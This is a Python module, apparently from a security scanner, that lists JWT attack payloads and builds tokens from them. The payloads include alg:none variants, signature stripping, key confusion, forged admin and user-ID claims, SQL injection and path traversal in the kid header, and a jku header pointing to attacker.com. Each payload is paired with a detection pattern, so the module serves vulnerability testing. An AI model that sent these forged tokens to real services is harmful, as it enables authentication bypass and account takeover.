"""
JWT (JSON Web Token) Manipulation Payloads

Collection of payloads for detecting JWT vulnerabilities including
algorithm confusion, weak signing, and claims manipulation.
"""

from dataclasses import dataclass
from typing import List
import base64
import json


@dataclass
class JWTPayload:
    """JWT manipulation payload."""
    header: dict
    payload_claims: dict
    signature: str
    technique: str
    description: str
    risk_indicator: str
    severity: str


def get_jwt_payloads() -> List[JWTPayload]:
    """Get all JWT manipulation payloads."""

    payloads = []

    # ==== ALGORITHM CONFUSION ====

    # alg: none
    payloads.append(JWTPayload(
        header={"alg": "none", "typ": "JWT"},
        payload_claims={"sub": "admin", "role": "administrator"},
        signature="",
        technique="alg_none",
        description="Remove signature requirement with alg:none",
        risk_indicator="alg.*none.*accepted",
        severity="critical"
    ))

    # alg: None (capital N)
    payloads.append(JWTPayload(
        header={"alg": "None", "typ": "JWT"},
        payload_claims={"sub": "admin", "role": "administrator"},
        signature="",
        technique="alg_none_case",
        description="Case variation of alg:none",
        risk_indicator="alg.*none.*accepted",
        severity="critical"
    ))

    # alg: NONE (uppercase)
    payloads.append(JWTPayload(
        header={"alg": "NONE", "typ": "JWT"},
        payload_claims={"sub": "admin", "role": "administrator"},
        signature="",
        technique="alg_none_case",
        description="Uppercase alg:NONE",
        risk_indicator="alg.*none.*accepted",
        severity="critical"
    ))

    # ==== SIGNATURE STRIPPING ====

    # Remove signature entirely
    payloads.append(JWTPayload(
        header={"alg": "HS256", "typ": "JWT"},
        payload_claims={"sub": "admin", "role": "administrator"},
        signature=None,  # Will be stripped in token generation
        technique="signature_strip",
        description="Remove signature from token",
        risk_indicator="signature.*not.*verified",
        severity="critical"
    ))

    # ==== KEY CONFUSION (HS256 vs RS256) ====

    # RS256 -> HS256 downgrade
    payloads.append(JWTPayload(
        header={"alg": "HS256", "typ": "JWT"},
        payload_claims={"sub": "admin", "role": "administrator"},
        signature="use_public_key_as_hmac_secret",
        technique="rs256_to_hs256",
        description="Sign with HS256 using public key as secret",
        risk_indicator="algorithm.*confusion",
        severity="critical"
    ))

    # ==== CLAIMS MANIPULATION ====

    # Role escalation
    payloads.append(JWTPayload(
        header={"alg": "HS256", "typ": "JWT"},
        payload_claims={
            "sub": "user@example.com",
            "role": "administrator",  # Escalate from user to admin
            "admin": True,
            "isAdmin": True
        },
        signature="original_signature",
        technique="role_escalation",
        description="Escalate role to administrator",
        risk_indicator="privilege.*escalation",
        severity="high"
    ))

    # User ID manipulation
    payloads.append(JWTPayload(
        header={"alg": "HS256", "typ": "JWT"},
        payload_claims={
            "sub": "1",  # Change to victim user ID
            "user_id": 1,
            "uid": "1"
        },
        signature="original_signature",
        technique="uid_manipulation",
        description="Change user ID to access other accounts",
        risk_indicator="unauthorized.*access",
        severity="high"
    ))

    # ==== KID (KEY ID) INJECTION ====

    # SQL injection in kid
    payloads.append(JWTPayload(
        header={
            "alg": "HS256",
            "typ": "JWT",
            "kid": "' OR 1=1--"
        },
        payload_claims={"sub": "admin"},
        signature="original_signature",
        technique="kid_sqli",
        description="SQL injection in kid header",
        risk_indicator="SQL.*error",
        severity="high"
    ))

    # Path traversal in kid
    payloads.append(JWTPayload(
        header={
            "alg": "HS256",
            "typ": "JWT",
            "kid": "../../../../../../dev/null"
        },
        payload_claims={"sub": "admin"},
        signature="",  # Empty file = empty key
        technique="kid_path_traversal",
        description="Path traversal to read empty key file",
        risk_indicator="signature.*bypass",
        severity="high"
    ))

    # URL injection in kid (JKU/JWK)
    payloads.append(JWTPayload(
        header={
            "alg": "RS256",
            "typ": "JWT",
            "jku": "http://attacker.com/jwks.json"
        },
        payload_claims={"sub": "admin"},
        signature="attacker_signature",
        technique="jku_injection",
        description="Point to attacker-controlled key server",
        risk_indicator="external.*key.*loaded",
        severity="critical"
    ))

    # ==== WEAK SECRETS ====

    # Empty secret
    payloads.append(JWTPayload(
        header={"alg": "HS256", "typ": "JWT"},
        payload_claims={"sub": "admin"},
        signature="sign_with_empty_secret",
        technique="weak_secret",
        description="Sign with empty HMAC secret",
        risk_indicator="weak.*secret",
        severity="critical"
    ))

    return payloads


def build_jwt_token(jwt_payload: JWTPayload) -> str:
    """
    Build a JWT token string from a JWTPayload.

    Args:
        jwt_payload: JWTPayload object

    Returns:
        JWT token string (header.payload.signature)
    """
    # Base64url encode header
    header_json = json.dumps(jwt_payload.header, separators=(',', ':'))
    header_b64 = base64.urlsafe_b64encode(header_json.encode()).decode().rstrip('=')

    # Base64url encode payload
    payload_json = json.dumps(jwt_payload.payload_claims, separators=(',', ':'))
    payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).decode().rstrip('=')

    # Handle signature
    if jwt_payload.signature is None:
        # Signature stripping - just header.payload
        return f"{header_b64}.{payload_b64}"
    elif jwt_payload.signature == "":
        # alg:none - header.payload.
        return f"{header_b64}.{payload_b64}."
    else:
        # Include signature (placeholder - actual signing would happen elsewhere)
        return f"{header_b64}.{payload_b64}.{jwt_payload.signature}"


def get_critical_payloads() -> List[JWTPayload]:
    """Get only critical severity payloads."""
    all_payloads = get_jwt_payloads()
    return [p for p in all_payloads if p.severity == 'critical']


def get_alg_none_payloads() -> List[JWTPayload]:
    """Get algorithm:none payloads."""
    all_payloads = get_jwt_payloads()
    return [p for p in all_payloads if 'alg_none' in p.technique]


def get_kid_injection_payloads() -> List[JWTPayload]:
    """Get kid header injection payloads."""
    all_payloads = get_jwt_payloads()
    return [p for p in all_payloads if 'kid' in p.technique or 'jku' in p.technique]
